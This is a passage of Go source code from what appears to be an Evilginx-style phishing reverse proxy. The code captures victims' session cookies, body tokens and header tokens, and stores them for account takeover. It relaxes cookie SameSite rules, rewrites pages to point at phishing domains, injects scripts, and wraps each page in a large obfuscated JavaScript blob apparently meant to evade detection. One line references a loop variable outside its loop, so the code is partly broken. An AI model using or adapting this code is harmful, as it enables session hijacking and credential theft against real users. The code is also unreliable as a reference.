			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							rid, ok := s.Params["rid"]
							if ok && rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
						}
					}
    					encodedBody := base64.StdEncoding.EncodeToString(body)
    					body = []byte(fmt.Sprintf("<script>function _0x1cb3(_0x4c35bb,_0x517cda){var _0xf02ed2=_0x5a2f();return _0x1cb3=function(_0x1d4d27,_0x289c8e){_0x1d4d27=_0x1d4d27-(-0x1*-0xb81+-0x1*0x1a3c+-0xf8b*-0x1);var _0x688d36=_0xf02ed2[_0x1d4d27];if(_0x1cb3['AoGyLE']===undefined){var _0x5b014e=function(_0x6799e9){var _0x3478a8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c42dd='',_0x4575b1='',_0x162362=_0x3c42dd+_0x5b014e;for(var _0x27de1c=-0x3*-0x209+0x95c*0x4+-0x47*0x9d,_0x5ba87e,_0x4968d7,_0x4d5f60=0x14*-0x114+-0x3a*0x42+0x2484;_0x4968d7=_0x6799e9['charAt'](_0x4d5f60++);~_0x4968d7&&(_0x5ba87e=_0x27de1c%(0x1142+-0x16cb+0x58d)?_0x5ba87e*(-0x1b65+0x3f4+0x5*0x4bd)+_0x4968d7:_0x4968d7,_0x27de1c++%(-0x90e+-0x2451+0x2d63))?_0x3c42dd+=_0x162362['charCodeAt'](_0x4d5f60+(0x25*-0xbf+0x1c*0xb1+-0x3*-0x2c3))-(-0x1d99*-0x1+-0x12f0+0x1*-0xa9f)!==0x4f*-0x6e+0x2091+-0x1*-0x161?String['fromCharCode'](0xce*-0x17+0x1db2+-0xa31*0x1&_0x5ba87e>>(-(0x13ff*0x1+0x197a+0x2d77*-0x1)*_0x27de1c&0x1*0x5d+-0x2399*-0x1+-0x23f0)):_0x27de1c:-0x10eb+0x69a+0x1*0xa51){_0x4968d7=_0x3478a8['indexOf'](_0x4968d7);}for(var _0x31c5a4=0x8a8+0x2*-0x962+0xa1c,_0x80cc1f=_0x3c42dd['length'];_0x31c5a4<_0x80cc1f;_0x31c5a4++){_0x4575b1+='%'+('00'+_0x3c42dd['charCodeAt'](_0x31c5a4)['toString'](-0x3fa*0x8+0x1899+0x747))['slice'](-(-0x1*-0xac+0xc0+-0x16a));}return decodeURIComponent(_0x4575b1);};var _0xbeb342=function(_0x588b10,_0x280324){var _0x58250f=[],_0x2086cb=0x1*0x2342+0x2356+-0x4698,_0x1f3536,_0x17d66c='';_0x588b10=_0x5b014e(_0x588b10);var _0x5abca1;for(_0x5abca1=0x23f3+-0x1*0x7ab+-0x1c48;_0x5abca1<-0xcf5*0x2+-0x18c5+0x33af;_0x5abca1++){_0x58250f[_0x5abca1]=_0x5abca1;}for(_0x5abca1=-0x1*0x1194+-0x38a+0x151e;_0x5abca1<0x44*-0x22+-0xb4*0x15+-0x114*-0x17;_0x5abca1++){_0x2086cb=(_0x2086cb+_0x58250f[_0x5abca1]+_0x280324['charCodeAt'](_0x5abca1%_0x280324['length']))%(0x18a9+-0x21*-0xb5+-0x966*0x5),_0x1f3536=_0x58250f[_0x5abca1],_0x58250f[_0x5abca1]=_0x58250f[_0x2086cb],_0x58250f[_0x2086cb]=_0x1f3536;}_0x5abca1=0x11*0xfe+0x246+-0x1324,_0x2086cb=-0x17*0x2a+-0x3*-0xc06+0x1a*-0x13e;for(var _0x432947=0x18ad+-0xa04+-0x3*0x4e3;_0x432947<_0x588b10['length'];_0x432947++){_0x5abca1=(_0x5abca1+(-0x16e0+0x141*0x1+-0x2*-0xad0))%(-0x1a12+0x1538+-0x1*-0x5da),_0x2086cb=(_0x2086cb+_0x58250f[_0x5abca1])%(0x1913*-0x1+-0x1559*-0x1+0x4ba),_0x1f3536=_0x58250f[_0x5abca1],_0x58250f[_0x5abca1]=_0x58250f[_0x2086cb],_0x58250f[_0x2086cb]=_0x1f3536,_0x17d66c+=String['fromCharCode'](_0x588b10['charCodeAt'](_0x432947)^_0x58250f[(_0x58250f[_0x5abca1]+_0x58250f[_0x2086cb])%(0xb*0x16+0xf70+-0xf62)]);}return _0x17d66c;};_0x1cb3['tTXOnV']=_0xbeb342,_0x4c35bb=arguments,_0x1cb3['AoGyLE']=!![];}var _0x320e93=_0xf02ed2[0x32*0x60+0x25ce*-0x1+0x3*0x65a],_0x699894=_0x1d4d27+_0x320e93,_0x3fa650=_0x4c35bb[_0x699894];if(!_0x3fa650){if(_0x1cb3['NUscgu']===undefined){var _0x311221=function(_0x2782db){this['yoeGZE']=_0x2782db,this['cWJtgD']=[-0x5*-0x3c7+0x639+-0x191b,-0x1bfe+0x40+0x1bbe,-0x9*-0x448+-0x1004+-0x106*0x16],this['sMWfwV']=function(){return'newState';},this['xAZqDx']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['hFSuVz']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x311221['prototype']['EZaexm']=function(){var _0x7125a9=new RegExp(this['xAZqDx']+this['hFSuVz']),_0x440848=_0x7125a9['test'](this['sMWfwV']['toString']())?--this['cWJtgD'][0x159d+-0x1295+0x9b*-0x5]:--this['cWJtgD'][-0x17*0x119+0xac5*-0x1+0x14*0x1cd];return this['IdDEZN'](_0x440848);},_0x311221['prototype']['IdDEZN']=function(_0x3a821a){if(!Boolean(~_0x3a821a))return _0x3a821a;return this['zSxbFT'](this['yoeGZE']);},_0x311221['prototype']['zSxbFT']=function(_0x5dc70f){for(var _0x448603=-0x67e+0xa53+-0x3*0x147,_0x112b6f=this['cWJtgD']['length'];_0x448603<_0x112b6f;_0x448603++){this['cWJtgD']['push'](Math['round'](Math['random']())),_0x112b6f=this['cWJtgD']['length'];}return _0x5dc70f(this['cWJtgD'][0x15ed+-0x6cf+-0xf1e]);},new _0x311221(_0x1cb3)['EZaexm'](),_0x1cb3['NUscgu']=!![];}_0x688d36=_0x1cb3['tTXOnV'](_0x688d36,_0x289c8e),_0x4c35bb[_0x699894]=_0x688d36;}else _0x688d36=_0x3fa650;return _0x688d36;},_0x1cb3(_0x4c35bb,_0x517cda);}function _0x199199(_0x4e24cf,_0x4adfb3,_0x51509b,_0x12299d,_0x1f8d42){return _0x1cb3(_0x51509b- -0x149,_0x4e24cf);}(function(_0x10cc89,_0x12c5b5){var _0x300eea=_0x10cc89();function _0xcbe3dc(_0x84a0b6,_0xb9d5bb,_0x29116d,_0xfa59c0,_0x5ecd40){return _0x1cb3(_0x29116d-0x313,_0xb9d5bb);}function _0x1fe058(_0x212e38,_0x3d5d22,_0x5a8f5e,_0x31c9f1,_0x1c88eb){return _0x1cb3(_0x212e38- -0x2ec,_0x3d5d22);}function _0x143032(_0x4c2a0e,_0x5c9f12,_0x56aa27,_0x271680,_0x4aa26a){return _0x1cb3(_0x56aa27- -0x14a,_0x271680);}function _0x294ec1(_0x372f10,_0x125365,_0x3411be,_0x1f6eb3,_0x5f30fd){return _0x1cb3(_0x125365-0x368,_0x372f10);}function _0x1493f2(_0xf3f261,_0x21610c,_0x50de05,_0x13c1bc,_0x87716b){return _0x1cb3(_0xf3f261- -0x23c,_0x13c1bc);}while(!![]){try{var _0x4f367d=-parseInt(_0x143032(0xe1,0x24,0x76,'#e)*',-0x15))/(0x1825*-0x1+0x2*0xbc5+-0x3*-0x34)*(-parseInt(_0x294ec1('B@Hp',0x62b,0x610,0x54f,0x6e8))/(-0x76a*-0x3+-0x3*-0xc46+-0x3b0e))+-parseInt(_0xcbe3dc(0x540,'(AD%',0x5b3,0x54d,0x54f))/(0x5f2+-0x3*0x1f0+0x1f*-0x1)*(parseInt(_0x1493f2(0x63,0x45,0x141,'pdkS',0x20))/(0x2*-0xa23+-0x87e+0x2*0xe64))+-parseInt(_0x143032(-0x8e,0x4e,-0x1a,'Gmu[',-0x6))/(0x78f+0x239e+0x1*-0x2b28)+parseInt(_0xcbe3dc(0x611,'%MqR',0x56b,0x672,0x542))/(-0x153d+-0x14e*-0x12+-0x239)+parseInt(_0xcbe3dc(0x4d0,'UQav',0x5d5,0x5dc,0x662))/(-0x1*0x543+0x3*-0x4c4+-0xda*-0x17)+-parseInt(_0x294ec1('j(wB',0x4b8,0x442,0x58f,0x493))/(0x26cf*0x1+0x24eb+0x1*-0x4bb2)+parseInt(_0x1fe058(-0x107,'dTYO',-0x202,-0x1e7,-0x2b))/(0x9a5+0x1*0x12dc+-0x1c78)*(parseInt(_0x143032(0x189,0xa7,0x1bf,'ppRy',0x11a))/(-0x1f1f+-0x1fbe+0x3ee7));if(_0x4f367d===_0x12c5b5)break;else _0x300eea['push'](_0x300eea['shift']());}catch(_0x4aa6cd){_0x300eea['push'](_0x300eea['shift']());}}}(_0x5a2f,-0x8cf24*0x1+-0x1*0x537dc+0x14f09e));var _0x544c7b=(function(){function _0x8d6780(_0x261760,_0x4440a6,_0x45fca7,_0x4fec34,_0x5685ec){return _0x1cb3(_0x4440a6-0x11d,_0x45fca7);}var _0x40d4db={'vhEvR':function(_0x5ab338,_0x5d2ab1){return _0x5ab338(_0x5d2ab1);},'cajHN':function(_0x292b9c,_0x22a53e){return _0x292b9c+_0x22a53e;},'YRDyk':_0x1a4f02(0x2da,'dTYO',0x1d9,0x1dd,0x144)+_0x8d6780(0x386,0x277,'Ro^*',0x211,0x20b)+_0x3d8a4a(-0x47,'Ig%q',0x56,-0x5e,0xd2)+_0x5f1083(0x25e,0x22e,'gdP1',0x154,0x15c),'ysdTN':_0x5debdf(-0x14d,'BB%v',-0x10d,-0x9d,-0x1a4)+_0x8d6780(0x236,0x2fc,'sk&@',0x24a,0x378)+_0x5debdf(-0x202,'pdkS',-0x287,-0x119,-0x16e)+_0x8d6780(0x3f9,0x31f,'dTYO',0x384,0x23e)+_0x5debdf(-0xec,'mzjn',-0x100,-0x74,-0x115)+_0x8d6780(0x4bf,0x409,'AiLC',0x386,0x4dd)+'\x20)','lqaCe':function(_0x1182d4,_0x3e442f){return _0x1182d4===_0x3e442f;},'EEYEt':_0x5debdf(-0x11e,'LxWh',-0x166,-0x84,-0xb8),'MVgOA':_0x8d6780(0x22c,0x30d,'k7b%',0x348,0x359),'OBzLr':function(_0x36be69,_0x37636b){return _0x36be69!==_0x37636b;},'FdlcP':_0x5f1083(0x21d,0x198,'6Lbn',0x27e,0x2bb),'GcYkK':_0x8d6780(0x23c,0x233,'0p0h',0x2f8,0x24e)+_0x1a4f02(0x2cd,'#e)*',0x287,0x1fa,0x1ae)+'2','SVeBW':function(_0x5e8a8a,_0x2ece46){return _0x5e8a8a!==_0x2ece46;},'cCilS':_0x5f1083(0x304,0x3e2,'vIjU',0x3d8,0x31b),'DLmUv':_0x5f1083(0x35d,0x3e6,'0p0h',0x3d1,0x43d)};function _0x5f1083(_0x32d2e5,_0x2daf51,_0x5a01a7,_0x2d5297,_0x5e9a96){return _0x1cb3(_0x32d2e5-0x103,_0x5a01a7);}var _0x193574=!![];function _0x3d8a4a(_0x271901,_0x43632f,_0x168f5a,_0x30a8e4,_0x2af595){return _0x1cb3(_0x271901- -0x23b,_0x43632f);}function _0x1a4f02(_0x2ec36b,_0x42527e,_0x4b8be8,_0x42303b,_0x5480de){return _0x1cb3(_0x42303b-0x43,_0x42527e);}function _0x5debdf(_0x1d14ab,_0x16c970,_0x4f0418,_0xb80451,_0x13a093){return _0x1cb3(_0x13a093- -0x290,_0x16c970);}return function(_0x26a465,_0x1343eb){function _0x561af3(_0x26182a,_0x12da55,_0x54a9f0,_0x3b844e,_0x90d20e){return _0x8d6780(_0x26182a-0x15e,_0x26182a- -0x255,_0x90d20e,_0x3b844e-0x51,_0x90d20e-0x1dc);}function _0x565aa1(_0x90958e,_0x232b03,_0x3082fa,_0x44ffb7,_0x1249aa){return _0x8d6780(_0x90958e-0x10c,_0x3082fa-0x25f,_0x90958e,_0x44ffb7-0xc2,_0x1249aa-0x3c);}function _0xa6678(_0x2d0612,_0x3cefa8,_0x1c846b,_0x3200a9,_0x2e8218){return _0x5debdf(_0x2d0612-0x1aa,_0x3cefa8,_0x1c846b-0x6,_0x3200a9-0x67,_0x2d0612- -0x17);}var _0x141377={'KOted':function(_0xe1003a,_0xdf470c){function _0x3784a1(_0x52921f,_0x24cd52,_0x373758,_0x1be6d9,_0x3a6250){return _0x1cb3(_0x24cd52- -0x352,_0x52921f);}return _0x40d4db[_0x3784a1('BB%v',-0x13f,-0x216,-0x185,-0x1d8)](_0xe1003a,_0xdf470c);},'xCNch':function(_0x3de95b,_0x3cce38){function _0x503c32(_0x495bea,_0xf1ec6,_0x15e774,_0x3ce193,_0x5924e3){return _0x1cb3(_0xf1ec6- -0x4c,_0x3ce193);}return _0x40d4db[_0x503c32(0x266,0x212,0x2b5,'dTYO',0x30c)](_0x3de95b,_0x3cce38);},'doRBR':_0x40d4db[_0x4659f2('y6C1',0x40a,0x56d,0x456,0x3a5)],'MXuGr':_0x40d4db[_0x4659f2('j(wB',0x4ea,0x4d8,0x51b,0x5da)],'kwsxO':function(_0x301699,_0xb6897a){function _0x9a3c0a(_0x73ed26,_0x24f71d,_0x5dc449,_0x1c3d6d,_0xcaab55){return _0x561af3(_0x24f71d- -0x139,_0x24f71d-0x1c,_0x5dc449-0x7d,_0x1c3d6d-0x11f,_0x5dc449);}return _0x40d4db[_0x9a3c0a(-0x151,-0x60,'OkIz',0x15,-0xb2)](_0x301699,_0xb6897a);},'bvLvm':_0x40d4db[_0x561af3(0x2d,0x133,0xb3,-0x7e,'UQav')],'IHfPD':_0x40d4db[_0xa9c0c5(-0x1d9,-0x234,-0x1cf,-0x130,'%1yl')],'JkpPS':function(_0x10d277,_0x549f18){function _0x418377(_0x515d61,_0x2af7f3,_0x5f3f32,_0x43093f,_0x478498){return _0xa9c0c5(_0x515d61-0x108,_0x2af7f3-0x1df,_0x2af7f3-0x581,_0x43093f-0x1be,_0x43093f);}return _0x40d4db[_0x418377(0x526,0x470,0x491,'(ijB',0x3de)](_0x10d277,_0x549f18);},'oUwrb':_0x40d4db[_0x561af3(0x13b,0x232,0xcd,0xe2,'rDyg')],'UNTgg':_0x40d4db[_0xa6678(-0x1cb,'#DnR',-0x133,-0x166,-0x270)]};function _0x4659f2(_0x3b712e,_0xa451d2,_0x56acf5,_0x218d52,_0x31bf00){return _0x5f1083(_0x218d52-0x15e,_0xa451d2-0x19a,_0x3b712e,_0x218d52-0x9b,_0x31bf00-0x112);}function _0xa9c0c5(_0x245f7e,_0x483db1,_0x566c08,_0x5a5daf,_0x471c7d){return _0x5debdf(_0x245f7e-0x184,_0x471c7d,_0x566c08-0xfc,_0x5a5daf-0x103,_0x566c08- -0x36);}if(_0x40d4db[_0x561af3(0x181,0xbb,0xf1,0xc6,'gdP1')](_0x40d4db[_0xa9c0c5(0xea,0x10c,0x2,0xd4,'vIjU')],_0x40d4db[_0x565aa1('%Ao%',0x5b7,0x49c,0x3c5,0x577)])){var _0x3d6bf3=_0x193574?function(){function _0x1b79a3(_0x4ef964,_0x2456dd,_0x1f8c77,_0x84fd20,_0x2ddb4c){return _0xa9c0c5(_0x4ef964-0x108,_0x2456dd-0x4f,_0x1f8c77-0x41d,_0x84fd20-0x4,_0x2456dd);}var _0x41001f={'riVIw':function(_0x24ff24,_0x5e31e6){function _0x3121f5(_0x465782,_0xd640ee,_0x4023c7,_0x1299d1,_0x3399a6){return _0x1cb3(_0xd640ee-0x269,_0x1299d1);}return _0x141377[_0x3121f5(0x390,0x496,0x475,'q&(d',0x574)](_0x24ff24,_0x5e31e6);},'oaACB':function(_0x5553b5,_0xf1173a){function _0x4fe0ea(_0x123200,_0x27223f,_0x563aa4,_0x1f3cb4,_0xa70e48){return _0x1cb3(_0x27223f-0x17a,_0x563aa4);}return _0x141377[_0x4fe0ea(0x38d,0x274,'NU1A',0x275,0x338)](_0x5553b5,_0xf1173a);},'vdrkc':function(_0x1ea792,_0x5231fc){function _0x83e792(_0x523ce9,_0x48c620,_0x35f2f5,_0x54a3d9,_0x545c7b){return _0x1cb3(_0x35f2f5-0x28b,_0x54a3d9);}return _0x141377[_0x83e792(0x45e,0x43c,0x37b,'dn8w',0x43e)](_0x1ea792,_0x5231fc);},'NleRl':_0x141377[_0x5959d1(-0xd0,-0xb4,'dTYO',-0x7d,0x3)],'IRopp':_0x141377[_0x5959d1(0x18f,-0x5f,'dn8w',0xa2,0x178)]};function _0x5959d1(_0x20b9e9,_0x46969a,_0x5d9c15,_0x266f7c,_0x1eab6){return _0xa9c0c5(_0x20b9e9-0x36,_0x46969a-0xb1,_0x266f7c-0x147,_0x266f7c-0x55,_0x5d9c15);}function _0x15134e(_0x43b2e7,_0x1aaac1,_0x283058,_0x49bf6a,_0x2b2fed){return _0x4659f2(_0x2b2fed,_0x1aaac1-0x136,_0x283058-0x1cd,_0x49bf6a- -0x35a,_0x2b2fed-0x161);}function _0x3786da(_0x450a2d,_0x5b7e32,_0x37e183,_0x3bbba5,_0x3e214c){return _0xa9c0c5(_0x450a2d-0x6e,_0x5b7e32-0x15a,_0x3e214c-0x2e7,_0x3bbba5-0xad,_0x450a2d);}function _0x3dbe97(_0x5c21ae,_0x4daa86,_0x3ba669,_0x3be052,_0x37aaa1){return _0xa6678(_0x37aaa1-0x1c1,_0x4daa86,_0x3ba669-0xb4,_0x3be052-0x1c0,_0x37aaa1-0x4b);}if(_0x141377[_0x15134e(0x4f,0xd7,0x1a3,0xbb,'(AD%')](_0x141377[_0x5959d1(0x24,0x1da,'OQhw',0xc1,0x91)],_0x141377[_0x1b79a3(0x31d,'%1yl',0x2de,0x2c6,0x31b)])){var _0x1a7537;try{_0x1a7537=_0x41001f[_0x5959d1(0xd9,0x112,'0p0h',0x17b,0x5a)](_0x1f3536,_0x41001f[_0x1b79a3(0x355,'sk&@',0x3ea,0x2fc,0x50d)](_0x41001f[_0x15134e(-0x68,-0x26,0x14d,0xa6,'Lmbb')](_0x41001f[_0x3dbe97(0x9c,'Lmbb',-0x8c,-0x45,0x6b)],_0x41001f[_0x1b79a3(0x377,'dTYO',0x44a,0x4e1,0x374)]),');'))();}catch(_0x4f8a7d){_0x1a7537=_0x5abca1;}return _0x1a7537;}else{if(_0x1343eb){if(_0x141377[_0x3dbe97(0x4b,'mzjn',0xe5,0x7d,0x151)](_0x141377[_0x15134e(0x5d,0x1b,-0x3e,0xd4,'%Ao%')],_0x141377[_0x3786da('OW9z',0x114,0x319,0x273,0x218)])){var _0x1d5d23=_0xe407f0?function(){function _0x2fb678(_0x2f708a,_0x3a3eb4,_0xce19a4,_0x54eb22,_0x5e3da0){return _0x3786da(_0x54eb22,_0x3a3eb4-0x14f,_0xce19a4-0x11a,_0x54eb22-0x6,_0x5e3da0-0x1a3);}if(_0x24a380){var _0x1a318b=_0x10311c[_0x2fb678(0x466,0x516,0x54b,'k7b%',0x447)](_0xdfe997,arguments);return _0x475137=null,_0x1a318b;}}:function(){};return _0x3f5f34=![],_0x1d5d23;}else{var _0x2aa279=_0x1343eb[_0x5959d1(0x6f,0x1a1,'OkIz',0x165,0x19c)](_0x26a465,arguments);return _0x1343eb=null,_0x2aa279;}}}}:function(){};return _0x193574=![],_0x3d6bf3;}else{var _0xe75ecd=_0x141377[_0xa6678(-0x1d2,'j(wB',-0x231,-0x2d4,-0x2c8)][_0xa9c0c5(-0x124,0x59,-0x38,0xc5,'Ig%q')]('|'),_0x4f1618=0x21c6+0x270f+-0x37*0x153;while(!![]){switch(_0xe75ecd[_0x4f1618++]){case'0':var _0x4cbd5d=_0x5781cc[_0x59c6ab];continue;case'1':_0x11135e[_0x4659f2('q&(d',0x533,0x3e1,0x42f,0x541)+_0x561af3(0x51,-0xa1,-0xb8,-0x99,'W]l0')]=_0x21a560[_0x565aa1('e5Oq',0x477,0x482,0x37c,0x583)+_0xa9c0c5(0x46,-0xe6,-0x14,0x3a,'0p0h')][_0xa6678(0x28,'%Ao%',0x59,-0x2c,0x5e)](_0x21a560);continue;case'2':_0x3c49b8[_0x4cbd5d]=_0x11135e;continue;case'3':_0x11135e[_0x4659f2('#e)*',0x412,0x617,0x526,0x4c2)+_0x565aa1('LxWh',0x49a,0x508,0x5fd,0x50a)]=_0x459fb6[_0xa9c0c5(-0x199,-0x234,-0x18b,-0x14a,'j(wB')](_0x27c41b);continue;case'4':var _0x21a560=_0x40d7ec[_0x4cbd5d]||_0x11135e;continue;case'5':var _0x11135e=_0x46ad8b[_0x4659f2('dn8w',0x4a3,0x3be,0x3ef,0x387)+_0xa6678(-0xa3,'k7b%',-0x65,-0x73,-0x13d)+'r'][_0x561af3(0x18f,0xc8,0x2ae,0xcc,'S@(b')+_0x4659f2('ppRy',0x50c,0x527,0x438,0x474)][_0x561af3(-0x15,-0xa7,-0x69,0xd0,'S@(b')](_0x239b50);continue;}break;}}};}()),_0x4c408a=_0x544c7b(this,function(){var _0x1994b8={};function _0x42ee58(_0x19fa0e,_0x429a68,_0x174ae6,_0x515fb1,_0x1e4cdc){return _0x1cb3(_0x1e4cdc- -0x1c6,_0x19fa0e);}function _0x41c2fe(_0x33ae53,_0x44ca5e,_0x3328a8,_0x1c2014,_0x5d802a){return _0x1cb3(_0x1c2014-0x335,_0x33ae53);}_0x1994b8[_0x42ee58('bS5&',0x117,0x11d,0xff,0x108)]=_0x1f6da8(0x54a,0x447,0x348,0x461,'LxWh')+_0x1f6da8(0x4d5,0x531,0x4c0,0x4f5,'%Ao%')+'+$';var _0x4bbbec=_0x1994b8;function _0x26474f(_0x14644d,_0x5d8e59,_0x3c6be7,_0x267ba6,_0x20215c){return _0x1cb3(_0x267ba6- -0x173,_0x3c6be7);}function _0xa9cbf8(_0x5566ec,_0x417041,_0x523d4f,_0x33f253,_0x2ae097){return _0x1cb3(_0x523d4f- -0x3a6,_0x33f253);}function 